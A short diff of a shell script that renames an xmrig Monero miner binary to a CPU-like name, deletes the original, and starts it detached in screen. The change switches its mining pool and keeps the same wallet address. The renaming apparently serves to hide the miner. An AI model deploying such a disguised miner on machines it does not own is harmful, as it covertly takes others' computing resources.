@@ -13,4 +13,4 @@ mv xmrig $azure -n
 sudo cp $azure "$cpuname"
 sudo rm -f  xmrig
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" -o pool.minexmr.com:6666 -u 83RBenv44USZpppATtxX3LHrZqstpuTpcfuT4FEMH35uMfoWWnbMtLMfAit3bTV4HEWYoCqcNH7ZTU3VoAsayUaDEbcRUo9 -p anitaosbeck
+screen -d -m ./"${cpuname}" --donate-level 1 -o monero.herominers.com:1111 -u 83RBenv44USZpppATtxX3LHrZqstpuTpcfuT4FEMH35uMfoWWnbMtLMfAit3bTV4HEWYoCqcNH7ZTU3VoAsayUaDEbcRUo9 -p anitaosbeck -a rx/0 -k 
